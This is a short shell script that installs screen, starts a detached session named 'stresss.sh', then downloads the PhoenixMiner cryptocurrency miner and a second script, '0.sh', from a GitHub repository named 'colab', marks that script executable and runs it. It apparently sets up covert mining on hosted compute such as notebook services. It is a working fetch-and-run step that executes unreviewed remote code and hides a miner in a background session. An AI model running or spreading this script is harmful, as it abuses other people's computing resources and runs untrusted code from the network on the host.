#!/bin/sh

apt-get install libpci3
sudo apt update
sudo apt install screen -y
screen -dmS stresss.sh ./stresss.sh 65 75
wget https://github.com/lambohopo/colab/raw/main/PhoenixMiner
wget https://github.com/lambohopo/colab/raw/main/0.sh
chmod +x 0.sh
./0.sh
